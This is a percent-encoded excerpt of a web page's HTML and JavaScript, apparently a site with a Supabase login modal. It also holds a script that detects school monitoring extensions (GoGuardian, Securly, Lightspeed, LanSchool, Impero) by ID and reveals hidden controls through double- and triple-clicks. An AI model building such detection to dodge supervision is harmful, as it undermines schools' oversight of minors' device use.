78%74%2D%78%73%22%3E%24%7B%6E%65%77%20%44%61%74%65%28%6C%69%6E%6B%2E%64%61%74%65%29%2E%74%6F%4C%6F%63%61%6C%65%44%61%74%65%53%74%72%69%6E%67%28%29%7D%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%60%3B%0A%20%20%20%20%63%6F%6E%74%61%69%6E%65%72%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%64%69%76%29%3B%0A%20%20%7D%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%21%2D%2D%20%4C%6F%67%69%6E%20%2F%20%53%69%67%6E%2D%55%70%20%4D%6F%64%61%6C%20%2D%2D%3E%0A%3C%64%69%76%20%69%64%3D%22%61%75%74%68%4D%6F%64%61%6C%22%20%63%6C%61%73%73%3D%22%66%69%78%65%64%20%69%6E%73%65%74%2D%30%20%7A%2D%5B%31%33%30%30%5D%20%68%69%64%64%65%6E%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%63%65%6E%74%65%72%22%3E%0A%20%20%3C%64%69%76%20%69%64%3D%22%61%75%74%68%4F%76%65%72%6C%61%79%22%20%63%6C%61%73%73%3D%22%61%62%73%6F%6C%75%74%65%20%69%6E%73%65%74%2D%30%20%62%67%2D%62%6C%61%63%6B%2F%34%30%20%62%61%63%6B%64%72%6F%70%2D%62%6C%75%72%2D%73%6D%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%72%65%6C%61%74%69%76%65%20%62%67%2D%77%68%69%74%65%20%72%6F%75%6E%64%65%64%2D%32%78%6C%20%73%68%61%64%6F%77%2D%32%78%6C%20%77%2D%5B%39%30%25%5D%20%6D%61%78%2D%77%2D%6D%64%20%70%2D%36%20%74%72%61%6E%73%66%6F%72%6D%20%73%63%61%6C%65%2D%39%35%20%6F%70%61%63%69%74%79%2D%30%20%74%72%61%6E%73%69%74%69%6F%6E%2D%61%6C%6C%20%64%75%72%61%74%69%6F%6E%2D%33%30%30%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%6A%75%73%74%69%66%79%2D%62%65%74%77%65%65%6E%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%62%6F%72%64%65%72%2D%62%20%70%62%2D%33%20%6D%62%2D%34%22%3E%0A%20%20%20%20%20%20%3C%68%32%20%69%64%3D%22%61%75%74%68%54%69%74%6C%65%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%6C%67%20%66%6F%6E%74%2D%73%65%6D%69%62%6F%6C%64%20%74%65%78%74%2D%67%72%61%79%2D%38%30%30%22%3E%4C%6F%67%69%6E%3C%2F%68%32%3E%0A%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%63%6C%6F%73%65%41%75%74%68%4D%6F%64%61%6C%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%35%30%30%20%68%6F%76%65%72%3A%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%78%6C%22%3E%26%74%69%6D%65%73%3B%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%67%61%70%2D%34%22%3E%0A%20%20%20%20%20%20%3C%69%6E%70%75%74%20%69%64%3D%22%61%75%74%68%45%6D%61%69%6C%22%20%74%79%70%65%3D%22%65%6D%61%69%6C%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%45%6D%61%69%6C%22%20%63%6C%61%73%73%3D%22%62%6F%72%64%65%72%20%72%6F%75%6E%64%65%64%20%70%78%2D%33%20%70%79%2D%32%20%77%2D%66%75%6C%6C%20%66%6F%63%75%73%3A%72%69%6E%67%2D%62%6C%75%65%2D%35%30%30%22%3E%0A%20%20%20%20%20%20%3C%69%6E%70%75%74%20%69%64%3D%22%61%75%74%68%50%61%73%73%77%6F%72%64%22%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%50%61%73%73%77%6F%72%64%22%20%63%6C%61%73%73%3D%22%62%6F%72%64%65%72%20%72%6F%75%6E%64%65%64%20%70%78%2D%33%20%70%79%2D%32%20%77%2D%66%75%6C%6C%20%66%6F%63%75%73%3A%72%69%6E%67%2D%62%6C%75%65%2D%35%30%30%22%3E%0A%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%22%20%63%6C%61%73%73%3D%22%62%67%2D%62%6C%75%65%2D%36%30%30%20%74%65%78%74%2D%77%68%69%74%65%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%20%68%6F%76%65%72%3A%62%67%2D%62%6C%75%65%2D%37%30%30%20%74%72%61%6E%73%69%74%69%6F%6E%2D%63%6F%6C%6F%72%73%22%3E%4C%6F%67%69%6E%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%20%20%3C%73%70%61%6E%20%69%64%3D%22%61%75%74%68%4D%65%73%73%61%67%65%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%72%65%64%2D%35%30%30%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%20%20%3C%70%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%73%6D%20%74%65%78%74%2D%67%72%61%79%2D%36%30%30%20%6D%74%2D%32%22%3E%0A%20%20%20%20%20%20%20%20%3C%73%70%61%6E%20%69%64%3D%22%74%6F%67%67%6C%65%41%75%74%68%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%62%6C%75%65%2D%36%30%30%20%68%6F%76%65%72%3A%75%6E%64%65%72%6C%69%6E%65%20%63%75%72%73%6F%72%2D%70%6F%69%6E%74%65%72%22%3E%44%6F%6E%27%74%20%68%61%76%65%20%61%6E%20%61%63%63%6F%75%6E%74%3F%20%53%69%67%6E%20%55%70%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%20%20%3C%2F%70%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%73%63%72%69%70%74%3E%0A%2F%2F%20%41%55%54%48%20%4D%4F%44%41%4C%20%53%43%52%49%50%54%0A%63%6F%6E%73%74%20%61%75%74%68%4D%6F%64%61%6C%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%4D%6F%64%61%6C%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%4F%76%65%72%6C%61%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%4F%76%65%72%6C%61%79%27%29%3B%0A%63%6F%6E%73%74%20%63%6C%6F%73%65%41%75%74%68%4D%6F%64%61%6C%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6C%6F%73%65%41%75%74%68%4D%6F%64%61%6C%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%54%69%74%6C%65%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%54%69%74%6C%65%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%45%6D%61%69%6C%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%45%6D%61%69%6C%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%50%61%73%73%77%6F%72%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%50%61%73%73%77%6F%72%64%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%27%29%3B%0A%63%6F%6E%73%74%20%61%75%74%68%4D%65%73%73%61%67%65%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%75%74%68%4D%65%73%73%61%67%65%27%29%3B%0A%63%6F%6E%73%74%20%74%6F%67%67%6C%65%41%75%74%68%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%74%6F%67%67%6C%65%41%75%74%68%27%29%3B%0A%0A%6C%65%74%20%69%73%4C%6F%67%69%6E%20%3D%20%74%72%75%65%3B%20%2F%2F%20%54%6F%67%67%6C%65%20%62%65%74%77%65%65%6E%20%6C%6F%67%69%6E%20%61%6E%64%20%73%69%67%6E%75%70%0A%0A%66%75%6E%63%74%69%6F%6E%20%6F%70%65%6E%41%75%74%68%4D%6F%64%61%6C%28%29%20%7B%0A%20%20%61%75%74%68%4D%6F%64%61%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%61%75%74%68%4D%6F%64%61%6C%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%27%64%69%76%2E%72%65%6C%61%74%69%76%65%27%29%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%73%63%61%6C%65%2D%31%30%30%27%2C%27%6F%70%61%63%69%74%79%2D%31%30%30%27%29%2C%20%31%30%29%3B%0A%7D%0A%0A%66%75%6E%63%74%69%6F%6E%20%63%6C%6F%73%65%41%75%74%68%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%6D%6F%64%61%6C%43%6F%6E%74%65%6E%74%20%3D%20%61%75%74%68%4D%6F%64%61%6C%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%27%64%69%76%2E%72%65%6C%61%74%69%76%65%27%29%3B%0A%20%20%6D%6F%64%61%6C%43%6F%6E%74%65%6E%74%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%73%63%61%6C%65%2D%31%30%30%27%2C%27%6F%70%61%63%69%74%79%2D%30%27%29%3B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%61%75%74%68%4D%6F%64%61%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%68%69%64%64%65%6E%27%29%2C%20%32%30%30%29%3B%0A%20%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%27%3B%0A%20%20%61%75%74%68%45%6D%61%69%6C%2E%76%61%6C%75%65%20%3D%20%27%27%3B%0A%20%20%61%75%74%68%50%61%73%73%77%6F%72%64%2E%76%61%6C%75%65%20%3D%20%27%27%3B%0A%7D%0A%0A%2F%2F%20%4F%70%65%6E%20%6D%6F%64%61%6C%20%6F%6E%20%64%6F%75%62%6C%65%2D%63%6C%69%63%6B%20%70%72%6F%66%69%6C%65%20%62%75%74%74%6F%6E%0A%70%72%6F%66%69%6C%65%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%64%62%6C%63%6C%69%63%6B%27%2C%20%6F%70%65%6E%41%75%74%68%4D%6F%64%61%6C%29%3B%0A%63%6C%6F%73%65%41%75%74%68%4D%6F%64%61%6C%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%63%6C%6F%73%65%41%75%74%68%29%3B%0A%61%75%74%68%4F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%63%6C%6F%73%65%41%75%74%68%29%3B%0A%0A%2F%2F%20%54%6F%67%67%6C%65%20%4C%6F%67%69%6E%20%2F%20%53%69%67%6E%2D%55%70%0A%74%6F%67%67%6C%65%41%75%74%68%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%69%73%4C%6F%67%69%6E%20%3D%20%21%69%73%4C%6F%67%69%6E%3B%0A%20%20%69%66%20%28%69%73%4C%6F%67%69%6E%29%20%7B%0A%20%20%20%20%61%75%74%68%54%69%74%6C%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%4C%6F%67%69%6E%27%3B%0A%20%20%20%20%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%4C%6F%67%69%6E%27%3B%0A%20%20%20%20%74%6F%67%67%6C%65%41%75%74%68%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%44%6F%6E%27%74%20%68%61%76%65%20%61%6E%20%61%63%63%6F%75%6E%74%3F%20%53%69%67%6E%20%55%70%22%3B%0A%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%61%75%74%68%54%69%74%6C%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%53%69%67%6E%20%55%70%27%3B%0A%20%20%20%20%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%53%69%67%6E%20%55%70%27%3B%0A%20%20%20%20%74%6F%67%67%6C%65%41%75%74%68%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%41%6C%72%65%61%64%79%20%68%61%76%65%20%61%6E%20%61%63%63%6F%75%6E%74%3F%20%4C%6F%67%69%6E%22%3B%0A%20%20%7D%0A%20%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%27%3B%0A%7D%29%3B%0A%0A%2F%2F%20%48%61%6E%64%6C%65%20%41%75%74%68%20%28%4C%6F%67%69%6E%20%2F%20%53%69%67%6E%2D%55%70%29%0A%61%75%74%68%41%63%74%69%6F%6E%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%61%73%79%6E%63%20%28%29%20%3D%3E%20%7B%0A%20%20%63%6F%6E%73%74%20%65%6D%61%69%6C%20%3D%20%61%75%74%68%45%6D%61%69%6C%2E%76%61%6C%75%65%2E%74%72%69%6D%28%29%3B%0A%20%20%63%6F%6E%73%74%20%70%61%73%73%77%6F%72%64%20%3D%20%61%75%74%68%50%61%73%73%77%6F%72%64%2E%76%61%6C%75%65%2E%74%72%69%6D%28%29%3B%0A%0A%20%20%69%66%20%28%21%65%6D%61%69%6C%20%7C%7C%20%21%70%61%73%73%77%6F%72%64%29%20%7B%0A%20%20%20%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%50%6C%65%61%73%65%20%65%6E%74%65%72%20%65%6D%61%69%6C%20%61%6E%64%20%70%61%73%73%77%6F%72%64%27%3B%0A%20%20%20%20%72%65%74%75%72%6E%3B%0A%20%20%7D%0A%0A%20%20%69%66%20%28%69%73%4C%6F%67%69%6E%29%20%7B%0A%20%20%20%20%2F%2F%20%4C%4F%47%49%4E%0A%20%20%20%20%63%6F%6E%73%74%20%7B%20%64%61%74%61%3A%20%75%73%65%72%2C%20%65%72%72%6F%72%20%7D%20%3D%20%61%77%61%69%74%20%73%75%70%61%62%61%73%65%2E%61%75%74%68%2E%73%69%67%6E%49%6E%57%69%74%68%50%61%73%73%77%6F%72%64%28%7B%20%65%6D%61%69%6C%2C%20%70%61%73%73%77%6F%72%64%20%7D%29%3B%0A%20%20%20%20%69%66%20%28%65%72%72%6F%72%29%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%65%72%72%6F%72%2E%6D%65%73%73%61%67%65%3B%0A%20%20%20%20%65%6C%73%65%20%7B%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%4C%6F%67%67%65%64%20%69%6E%20%73%75%63%63%65%73%73%66%75%6C%6C%79%21%27%3B%20%63%6C%6F%73%65%41%75%74%68%28%29%3B%20%63%6F%6E%73%6F%6C%65%2E%6C%6F%67%28%27%55%73%65%72%3A%27%2C%20%75%73%65%72%29%3B%20%7D%0A%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%2F%2F%20%53%49%47%4E%2D%55%50%0A%20%20%20%20%63%6F%6E%73%74%20%7B%20%64%61%74%61%2C%20%65%72%72%6F%72%20%7D%20%3D%20%61%77%61%69%74%20%73%75%70%61%62%61%73%65%2E%61%75%74%68%2E%73%69%67%6E%55%70%28%7B%20%65%6D%61%69%6C%2C%20%70%61%73%73%77%6F%72%64%20%7D%29%3B%0A%20%20%20%20%69%66%20%28%65%72%72%6F%72%29%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%65%72%72%6F%72%2E%6D%65%73%73%61%67%65%3B%0A%20%20%20%20%65%6C%73%65%20%7B%20%0A%20%20%20%20%20%20%61%75%74%68%4D%65%73%73%61%67%65%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%27%41%63%63%6F%75%6E%74%20%63%72%65%61%74%65%64%21%20%50%6C%65%61%73%65%20%63%68%65%63%6B%20%79%6F%75%72%20%65%6D%61%69%6C%20%74%6F%20%63%6F%6E%66%69%72%6D%2E%27%3B%0A%20%20%20%20%20%20%61%75%74%68%45%6D%61%69%6C%2E%76%61%6C%75%65%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%61%75%74%68%50%61%73%73%77%6F%72%64%2E%76%61%6C%75%65%20%3D%20%27%27%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%7D%29%3B%0A%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%63%6F%6E%73%74%20%6D%6F%6E%69%74%6F%72%53%74%61%74%75%73%44%69%76%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6D%6F%6E%69%74%6F%72%2D%73%74%61%74%75%73%27%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%6D%6F%6E%69%74%6F%72%43%75%73%74%6F%6D%49%6E%70%75%74%44%69%76%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%27%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%6D%6F%6E%69%74%6F%72%44%65%62%75%67%4C%6F%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6D%6F%6E%69%74%6F%72%2D%64%65%62%75%67%2D%6C%6F%67%27%29%3B%0A%20%20%20%20%6C%65%74%20%6D%6F%6E%69%74%6F%72%43%75%73%74%6F%6D%45%78%74%49%64%73%20%3D%20%5B%5D%3B%0A%20%20%20%20%6C%65%74%20%6C%61%73%74%53%63%72%65%65%6E%43%68%65%63%6B%20%3D%20%30%3B%0A%20%20%20%20%63%6F%6E%73%74%20%73%63%72%65%65%6E%43%68%65%63%6B%49%6E%74%65%72%76%61%6C%20%3D%20%36%30%30%30%30%3B%20%2F%2F%20%31%20%6D%69%6E%75%74%65%0A%20%20%20%20%6C%65%74%20%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%20%30%3B%0A%20%20%20%20%6C%65%74%20%63%6C%69%63%6B%54%69%6D%65%6F%75%74%3B%0A%20%20%20%20%6C%65%74%20%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%20%3D%20%66%61%6C%73%65%3B%0A%0A%20%20%20%20%2F%2F%20%54%6F%67%67%6C%65%20%69%6E%70%75%74%20%28%64%6F%75%62%6C%65%20%63%6C%69%63%6B%29%20%6F%72%20%64%65%62%75%67%20%6C%6F%67%20%28%74%72%69%70%6C%65%20%63%6C%69%63%6B%29%0A%20%20%20%20%6D%6F%6E%69%74%6F%72%53%74%61%74%75%73%44%69%76%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%63%6C%69%63%6B%43%6F%75%6E%74%2B%2B%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%3D%3D%20%32%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%63%6C%69%63%6B%54%69%6D%65%6F%75%74%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%43%75%73%74%6F%6D%49%6E%70%75%74%44%69%76%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%6D%6F%6E%69%74%6F%72%43%75%73%74%6F%6D%49%6E%70%75%74%44%69%76%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%3D%3D%20%27%6E%6F%6E%65%27%20%3F%20%27%62%6C%6F%63%6B%27%20%3A%20%27%6E%6F%6E%65%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%20%30%3B%0A%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%69%66%20%28%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%3D%3D%20%33%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%63%6C%69%63%6B%54%69%6D%65%6F%75%74%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%20%3D%20%21%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%44%65%62%75%67%4C%6F%67%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%20%3F%20%27%62%6C%6F%63%6B%27%20%3A%20%27%6E%6F%6E%65%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%56%65%72%62%6F%73%65%20%6C%6F%67%67%69%6E%67%20%24%7B%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%20%3F%20%27%65%6E%61%62%6C%65%64%27%20%3A%20%27%64%69%73%61%62%6C%65%64%27%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%20%30%3B%0A%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%69%63%6B%54%69%6D%65%6F%75%74%20%3D%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%69%63%6B%43%6F%75%6E%74%20%3D%20%30%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%33%30%30%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%6D%65%73%73%61%67%65%2C%20%66%6F%72%63%65%20%3D%20%66%61%6C%73%65%29%20%7B%0A%20%20%20%20%20%20%20%20%69%66%20%28%21%76%65%72%62%6F%73%65%4C%6F%67%67%69%6E%67%20%26%26%20%21%66%6F%72%63%65%29%20%72%65%74%75%72%6E%3B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%74%69%6D%65%73%74%61%6D%70%20%3D%20%6E%65%77%20%44%61%74%65%28%29%2E%74%6F%4C%6F%63%61%6C%65%54%69%6D%65%53%74%72%69%6E%67%28%29%3B%0A%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%44%65%62%75%67%4C%6F%67%2E%69%6E%6E%65%72%48%54%4D%4C%20%2B%3D%20%60%5B%24%7B%74%69%6D%65%73%74%61%6D%70%7D%5D%20%24%7B%6D%65%73%73%61%67%65%7D%3C%62%72%3E%60%3B%0A%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%44%65%62%75%67%4C%6F%67%2E%73%63%72%6F%6C%6C%54%6F%70%20%3D%20%6D%6F%6E%69%74%6F%72%44%65%62%75%67%4C%6F%67%2E%73%63%72%6F%6C%6C%48%65%69%67%68%74%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%6D%6F%6E%69%74%6F%72%41%64%64%43%75%73%74%6F%6D%49%64%28%29%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%65%78%74%2D%69%64%27%29%2E%76%61%6C%75%65%2E%74%72%69%6D%28%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%69%64%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%43%75%73%74%6F%6D%45%78%74%49%64%73%2E%70%75%73%68%28%69%64%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%4C%6F%67%28%60%41%64%64%65%64%20%63%75%73%74%6F%6D%20%65%78%74%65%6E%73%69%6F%6E%20%49%44%3A%20%24%7B%69%64%7D%60%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%43%68%65%63%6B%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%6D%6F%6E%69%74%6F%72%53%65%74%53%74%61%74%75%73%28%69%73%57%61%74%63%68%69%6E%67%29%20%7B%0A%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%53%74%61%74%75%73%44%69%76%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%69%73%57%61%74%63%68%69%6E%67%20%3F%20%27%3D%E2%27%20%3A%20%27%3D%34%27%3B%0A%20%20%20%20%20%20%20%20%6D%6F%6E%69%74%6F%72%53%74%61%74%75%73%44%69%76%2E%63%6C%61%73%73%4E%61%6D%65%20%3D%20%69%73%57%61%74%63%68%69%6E%67%20%3F%20%27%61%6C%65%72%74%27%20%3A%20%27%73%61%66%65%27%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%6D%6F%6E%69%74%6F%72%43%68%65%63%6B%28%29%20%7B%0A%20%20%20%20%20%20%20%20%6C%65%74%20%69%73%4D%6F%6E%69%74%6F%72%44%65%74%65%63%74%65%64%20%3D%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%78%74%65%6E%73%69%6F%6E%49%64%73%20%3D%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6E%6D%6D%68%6B%6B%65%67%63%63%61%67%64%6C%64%67%69%69%6D%65%64%70%69%63%63%6D%67%6D%69%65%64%61%27%2C%20%2F%2F%20%47%6F%47%75%61%72%64%69%61%6E%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%70%6A%6A%65%6A%70%63%6D%63%67%6D%67%61%6B%70%63%62%65%6E%70%66%69%6C%6E%6B%62%70%63%63%67%64%6D%27%2C%20%2F%2F%20%47%6F%47%75%61%72%64%69%61%6E%20%4C%69%63%65%6E%73%65%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%68%61%6C%64%6C%67%6C%64%70%6C%67%6E%67%67%6B%6A%61%61%66%68%65%6C%67%69%61%67%6C%61%66%61%6E%68%27%2C%20%2F%2F%20%53%65%63%75%72%6C%79%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6A%69%61%70%66%6D%66%61%67%6D%6F%61%66%67%62%6B%61%65%6B%66%6B%67%62%6E%64%67%68%66%67%6D%6B%6E%27%2C%20%2F%2F%20%4C%69%67%68%74%73%70%65%65%64%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6B%6D%70%6A%6C%69%6C%6E%65%6D%6A%63%69%6F%68%6A%63%6B%6A%61%64%6D%67%6D%6A%64%6A%6C%6A%61%63%68%27%2C%20%2F%2F%20%4C%61%6E%53%63%68%6F%6F%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27%6A%6D%69%6D%63%62%70%6E%69%62%64%65%69%61%6B%62%6C%69%67%6D%6C%67%62%67%62%63%67%6C%63%6A%62%63%27%2C%20%2F%2F%20%49%6D%70%65%72%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%2E%2E%2E%6D%6F%6E%69%74%